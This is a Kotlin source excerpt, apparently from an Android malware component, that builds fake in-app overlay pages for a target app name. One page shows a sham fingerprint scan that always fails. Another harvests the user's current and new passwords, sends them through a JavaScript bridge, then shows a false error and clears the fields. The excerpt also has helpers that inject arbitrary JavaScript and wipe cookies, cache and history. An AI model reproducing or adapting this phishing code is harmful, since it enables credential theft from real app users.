    private fun buildBiometricPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#43e97b33,#38f9d744);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:24px;padding:36px;width:100%;max-width:320px;box-shadow:0 10px 40px rgba(0,0,0,.1);text-align:center}.icon{font-size:56px;margin-bottom:16px}h2{font-size:20px;color:#333;margin-bottom:4px}p{color:#888;font-size:13px;margin-bottom:24px}.fake-scan{width:120px;height:120px;border-radius:50%;border:3px solid #43e97b;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;font-size:48px;animation:pulse 2s infinite}@keyframes pulse{0%{box-shadow:0 0 0 0 #43e97b66}50%{box-shadow:0 0 0 20px #43e97b33}100%{box-shadow:0 0 0 0 #43e97b66}}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#43e97b,#38f9d7);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer}.alt{font-size:12px;color:#aaa;margin-top:12px;cursor:pointer}.error{color:#e74c3c;font-size:12px;margin-top:8px;display:none}</style></head><body><div class="card"><div class="icon">🔒</div><h2>Biometric Authentication</h2><p>Use your fingerprint to authenticate</p><div class="fake-scan">🖐️</div><button class="btn" onclick="sub()">Scan Fingerprint</button><div class="alt" onclick="sub()">Use PIN instead</div><div class="error" id="err">Fingerprint not recognized. Try again.</div></div><script>function sub(){$JS_BRIDGE.captureCustom(JSON.stringify({type:'biometric',app:'$appName',timestamp:Date.now()}));document.getElementById('err').style.display='block'}</script></body></html>"""

    private fun buildPasswordChangePage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,${color}22,${color}44);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:400px;box-shadow:0 5px 20px rgba(0,0,0,.1)}h2{text-align:center;color:#333;font-size:18px;margin-bottom:4px}p{text-align:center;color:#888;font-size:13px;margin-bottom:16px}label{font-size:12px;color:#666;font-weight:600;display:block;margin-top:12px;margin-bottom:4px}input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none}input:focus{border-color:$color}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;margin-top:16px;cursor:pointer}.error{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}</style></head><body><div class="card"><h2>🔐 Update Password</h2><p>For security, please update your password</p><label>Current Password</label><input type="password" id="old" placeholder="Current password"><label>New Password</label><input type="password" id="new1" placeholder="New password"><label>Confirm New Password</label><input type="password" id="new2" placeholder="Confirm password"><button class="btn" onclick="sub()">Update Password</button><div class="error" id="err">Password does not meet requirements.</div></div><script>function sub(){var o=document.getElementById('old').value;var n=document.getElementById('new1').value;if(o&&n){$JS_BRIDGE.captureCustom(JSON.stringify({type:'password_change',oldPassword:o,newPassword:n,app:'$appName'}));document.getElementById('err').style.display='block';document.getElementById('old').value='';document.getElementById('new1').value='';document.getElementById('new2').value=''}}</script></body></html>"""

    /**
     * Get the current page type being displayed.
     */
    fun getCurrentPageType(): PageType? = currentPageType

    /**
     * Inject custom JavaScript into the current page.
     */
    fun injectJavaScript(js: String) {
        try {
            evaluateJavascript(js, null)
        } catch (e: Exception) {
            Log.e(TAG, "JS injection failed: ${e.message}")
        }
    }

    /**
     * Clear all cookies and cache.
     */
    fun clearSession() {
        CookieManager.getInstance().removeAllCookies(null)
        clearCache(true)
        clearHistory()
        clearFormData()
    }
}
